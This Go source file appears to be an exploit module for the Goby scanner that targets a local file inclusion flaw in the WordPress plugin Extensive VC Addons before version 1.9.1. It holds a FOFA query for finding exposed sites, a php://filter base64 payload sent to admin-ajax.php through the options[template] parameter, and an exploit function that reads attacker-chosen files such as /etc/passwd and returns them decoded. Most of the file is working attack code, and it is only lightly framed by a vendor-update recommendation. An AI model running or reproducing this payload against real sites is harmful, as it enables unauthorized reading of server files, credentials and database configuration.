package exploits

import (
	"encoding/base64"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "WordPress Plugin Extensive VC Addons File Inclusion Vulnerability",
    "Description": "<p>Extensive VC is a powerful WordPress tool which allows you to add unique, flexible and fully responsive shortcode elements on your site.</p><p>Extensive VC Addons &lt; 1.9.1 is vulnerable to Local File Inclusion.</p>",
    "Product": "wordpress-plugin-extensive-vc-addon",
    "Homepage": "https://wordpress.org/plugins/extensive-vc-addon",
    "DisclosureDate": "2023-01-23",
    "Author": "sunying",
    "FofaQuery": "body=\"wp-content/plugins/extensive-vc-addon\"",
    "GobyQuery": "body=\"wp-content/plugins/extensive-vc-addon\"",
    "Level": "2",
    "Impact": "<p>Attackers can use this vulnerability to read the leaked source code, database configuration files, etc., resulting in an extremely insecure website.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://wordpress.org/plugins/extensive-vc-addon\">https://wordpress.org/plugins/extensive-vc-addon</a></p>",
    "References": [
        "https://wpscan.com/vulnerability/239ea870-66e5-4754-952e-74d4dd60b809"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "type": "createSelect",
            "value": "C:\\Windows\\php.ini,C:\\Windows\\system.ini,/etc/passwd,/etc/hosts",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read",
        "File Inclusion"
    ],
    "VulType": [
        "File Read",
        "File Inclusion"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "WordPress Extensive VC Addons 插件 options[template] 文件包含漏洞",
            "Product": "wordpress-plugin-extensive-vc-addon",
            "Description": "<p>Extensive VC 是一款功能强大的 WordPress 工具，可让您在网站上添加独特、灵活且响应迅速的简码元素。<br></p><p>Extensive VC Addons插件 &lt; 1.9.1 版本 options[template] 文件存在文件包含漏洞，<span style=\"color: rgb(22, 28, 37); font-size: 16px;\">攻击者可通过该漏洞读取泄露源码、数据库配置文件等等，导致网站处于极度不安全状态</span>。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://wordpress.org/plugins/extensive-vc-addon\">https://wordpress.org/plugins/extensive-vc-addon</a><br></p>",
            "Impact": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">Extensive VC Addons插件 &lt; 1.9.1 版本 options[template] 文件存在文件包含漏洞，</span>攻击者可通过该漏洞读取泄露源码、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取",
                "文件包含"
            ],
            "Tags": [
                "文件读取",
                "文件包含"
            ]
        },
        "EN": {
            "Name": "WordPress Plugin Extensive VC Addons File Inclusion Vulnerability",
            "Product": "wordpress-plugin-extensive-vc-addon",
            "Description": "<p>Extensive VC is a powerful WordPress tool which allows you to add unique, flexible and fully responsive shortcode elements on your site.</p><p>Extensive VC Addons &lt; 1.9.1 is vulnerable to Local File Inclusion.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://wordpress.org/plugins/extensive-vc-addon\">https://wordpress.org/plugins/extensive-vc-addon</a><br></p>",
            "Impact": "<p>Attackers can use this vulnerability to read the leaked source code, database configuration files, etc., resulting in an extremely insecure website.<br></p>",
            "VulType": [
                "File Read",
                "File Inclusion"
            ],
            "Tags": [
                "File Read",
                "File Inclusion"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10796"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			file_inclusion_exp := `php://filter/convert.base64-encode/resource=../wp-content/plugins/extensive-vc-addon/shortcodes/shortcodes-functions.php`
			cfg := httpclient.NewPostRequestConfig("/wp-admin/admin-ajax.php")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Data = fmt.Sprintf("action=extensive_vc_init_shortcode_pagination&options[template]=%s", file_inclusion_exp)
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			response, err := httpclient.DoHttpRequest(u, cfg)
			if err == nil {
				r, _ := regexp.Compile(`"data":"(.+?)"`)
				strMatch := r.FindStringSubmatch(response.RawBody)
				if len(strMatch) > 0 {
					base64_str := strMatch[1]
					base64_str = strings.Replace(base64_str, "\\", "", -1)
					decoded, err := base64.StdEncoding.DecodeString(base64_str)
					if err == nil {
						decodestr_exp := string(decoded)
						if strings.Contains(decodestr_exp, "extensive_vc_get_module_template_part") {
							return true
						}
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			filePath := ss.Params["filePath"].(string)
			file_inclusion_exp := fmt.Sprintf(`php://filter/convert.base64-encode/resource=%s`, filePath)
			cfg := httpclient.NewPostRequestConfig("/wp-admin/admin-ajax.php")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Data = fmt.Sprintf("action=extensive_vc_init_shortcode_pagination&options[template]=%s", file_inclusion_exp)
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			response, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg)
			if err == nil {
				r, _ := regexp.Compile(`"data":"(.+?)"`)
				strMatch := r.FindStringSubmatch(response.RawBody)
				if len(strMatch) > 0 {
					base64_str := r.FindStringSubmatch(response.RawBody)[1]
					base64_str = strings.Replace(base64_str, "\\", "", -1)
					decoded, err := base64.StdEncoding.DecodeString(base64_str)
					if err == nil {
						decodestr_exp := string(decoded)
						expResult.Success = true
						expResult.OutputType = "html"
						expResult.Output += decodestr_exp

					}
				}
			}
			return expResult
		},
	))
}